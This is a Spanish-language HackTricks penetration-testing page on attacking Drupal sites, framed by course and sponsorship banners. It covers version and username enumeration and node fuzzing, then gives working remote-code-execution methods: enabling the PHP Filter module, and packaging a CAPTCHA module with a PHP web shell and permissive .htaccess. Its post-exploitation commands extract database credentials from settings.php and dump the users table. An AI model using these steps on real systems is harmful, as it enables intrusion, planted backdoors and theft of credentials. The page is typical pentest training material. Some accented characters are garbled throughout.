# Drupal

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Descubrimiento

* Verifica **meta**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Nodo**: Drupal **indexa su contenido utilizando nodos**. Un nodo puede **contener cualquier cosa** como una publicaci贸n de blog, encuesta, art铆culo, etc. Las URIs de las p谩ginas suelen tener la forma `/node/<nodeid>`.
```bash
curl drupal-site.com/node/1
```
## Enumeraci贸n

Drupal admite **tres tipos de usuarios** de forma predeterminada:

1. **`Administrador`**: Este usuario tiene control total sobre el sitio web de Drupal.
2. **`Usuario Autenticado`**: Estos usuarios pueden iniciar sesi贸n en el sitio web y realizar operaciones como agregar y editar art铆culos seg煤n sus permisos.
3. **`An贸nimo`**: Todos los visitantes del sitio web se designan como an贸nimos. Por defecto, a estos usuarios solo se les permite leer publicaciones.

### Versi贸n

* Verificar `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Las nuevas instalaciones de Drupal bloquean por defecto el acceso a los archivos `CHANGELOG.txt` y `README.txt`.
{% endhint %}

### Enumeraci贸n de nombres de usuario

#### Registro

En _/user/register_ simplemente intenta crear un nombre de usuario y si el nombre ya est谩 tomado, se te notificar谩:

![](<../../.gitbook/assets/image (328).png>)

#### Solicitar nueva contrase帽a

Si solicitas una nueva contrase帽a para un nombre de usuario existente:

![](<../../.gitbook/assets/image (903).png>)

Si solicitas una nueva contrase帽a para un nombre de usuario que no existe:

![](<../../.gitbook/assets/image (307).png>)

### Obtener n煤mero de usuarios

Accediendo a _/user/\<n煤mero>_ puedes ver la cantidad de usuarios existentes, en este caso son 2 ya que _/users/3_ devuelve un error de no encontrado:

![](<../../.gitbook/assets/image (333).png>)

![](<../../.gitbook/assets/image (227) (1) (1) (1).png>)

### P谩ginas ocultas

**Fuzz `/node/$` donde `$` es un n煤mero** (de 1 a 500 por ejemplo).\
Podr铆as encontrar **p谩ginas ocultas** (de prueba, desarrollo) que no est谩n referenciadas por los motores de b煤squeda.

#### Informaci贸n de m贸dulos instalados
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### Autom谩tico
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### Con el M贸dulo Filtro PHP

{% hint style="warning" %}
En versiones antiguas de Drupal **(antes de la versi贸n 8)**, era posible iniciar sesi贸n como administrador y **habilitar el m贸dulo `PHP filter`**, que "Permite evaluar c贸digo/snippets PHP incrustados."
{% endhint %}

Necesitas que el **plugin php est茅 instalado** (verifica accediendo a _/modules/php_ y si devuelve un **403** entonces, **existe**, si **no se encuentra**, entonces el **plugin php no est谩 instalado**)

Ve a _M贸dulos_ -> (**Marca**) _Filtro PHP_ -> _Guardar configuraci贸n_

![](<../../.gitbook/assets/image (247) (1).png>)

Luego haz clic en _Agregar contenido_ -> Selecciona _P谩gina b谩sica_ o _Art铆culo_ -> Escribe _c贸digo shell php en el cuerpo_ -> Selecciona _C贸digo PHP_ en _Formato de texto_ -> Selecciona _Vista previa_

![](<../../.gitbook/assets/image (338).png>)

Finalmente solo accede al nodo reci茅n creado:
```bash
curl http://drupal-site.local/node/3
```
### Instalar el M贸dulo PHP Filter

Desde la versi贸n **8 en adelante**, el [**m贸dulo PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **no se instala por defecto**. Para aprovechar esta funcionalidad, tendr铆amos que **instalar el m贸dulo nosotros mismos**.

1. Descargar la versi贸n m谩s reciente del m贸dulo desde el sitio web de Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Una vez descargado, ir a **`Administraci贸n`** > **`Informes`** > **`Actualizaciones disponibles`**.
3. Hacer clic en **`Examinar`**, seleccionar el archivo del directorio donde lo descargamos y luego hacer clic en **`Instalar`**.
4. Una vez instalado el m贸dulo, podemos hacer clic en **`Contenido`** y **crear una nueva p谩gina b谩sica**, similar a como lo hicimos en el ejemplo de Drupal 7. Nuevamente, aseg煤rese de **seleccionar `C贸digo PHP` desde el men煤 desplegable de `Formato de texto`**.

### M贸dulo con Puerta Trasera

Un m贸dulo con puerta trasera se puede crear **agregando un shell a un m贸dulo existente**. Los m贸dulos se pueden encontrar en el sitio web drupal.org. Elija un m贸dulo como [CAPTCHA](https://www.drupal.org/project/captcha). Despl谩cese hacia abajo y copie el enlace para el archivo tar.gz [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Descargue el archivo y extraiga su contenido.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Crear una **shell web en PHP** con el contenido:
```php
<?php
system($_GET["cmd"]);
?>
```
* A continuaci贸n, necesitamos crear un archivo **`.htaccess`** para darnos acceso a la carpeta. Esto es necesario ya que Drupal niega el acceso directo a la carpeta **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* La configuraci贸n anterior aplicar谩 reglas para la carpeta / cuando solicitemos un archivo en /modules. Copia ambos de estos archivos a la carpeta captcha y crea un archivo.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Suponiendo que tenemos **acceso administrativo** al sitio web, haz clic en **`Administrar`** y luego en **`Extender`** en la barra lateral. A continuaci贸n, haz clic en el bot贸n **`+ Instalar nuevo m贸dulo`**, y seremos llevados a la p谩gina de instalaci贸n, como `http://drupal-site.local/admin/modules/install`. Navega hasta el archivo de Captcha con puerta trasera y haz clic en **`Instalar`**.
* Una vez que la instalaci贸n tenga 茅xito, navega a **`/modules/captcha/shell.php`** para ejecutar comandos.

## Post Explotaci贸n

### Leer settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### Volcar usuarios de la base de datos
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## Referencias

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
